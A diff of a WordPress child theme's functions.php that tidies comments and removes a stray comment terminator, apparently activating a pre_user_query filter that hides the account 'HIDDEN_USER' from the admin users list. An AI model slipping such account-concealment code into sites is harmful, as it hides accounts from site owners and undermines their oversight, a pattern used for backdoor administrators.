@@ -1,15 +1,10 @@
 <?php
-/**
- * Theme functions and definitions
- *
- * @package HelloElementorChild
- */
-
-/**
- * Load child theme css and optional scripts
- *
- * @return void
- */
+// Theme functions and definitions
+// @package HelloElementorChild
+ 
+// Load child theme css and optional scripts
+// @return void
+ 
 function hello_elementor_child_enqueue_scripts() {
 	wp_enqueue_style(
 		'hello-elementor-child-style',
@@ -23,9 +18,9 @@ function hello_elementor_child_enqueue_scripts() {
 
 add_action( 'wp_enqueue_scripts', 'hello_elementor_child_enqueue_scripts', 20 );
 
-/********************************/
-/* Useful functions for security */
-/********************************/
+//-------------------------------//
+//-Useful functions for security-//
+//-------------------------------//
 
 // _Forgot Password_ function avialable only for $admin_can_change
 $admin_can_change = ''; // put admin user here
@@ -53,8 +48,7 @@ function wpc_elementor_shortcode_2( $atts ) {
 add_shortcode( 'my_elementor_postcontent_shorter', 'wpc_elementor_shortcode_2');
 
 
-// Nascondi utente dalla lista
-
+// Hide User from Users list
 add_action('pre_user_query','site_pre_user_query');
 function site_pre_user_query($user_search) {
 	global $current_user;
@@ -69,7 +63,6 @@ function site_pre_user_query($user_search) {
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'HIDDEN_USER'",$user_search->query_where);
   }
 }
-*/
 
 /*REMOVE SIMPLY DISCOVER*/
 remove_action('wp_head', 'rsd_link');
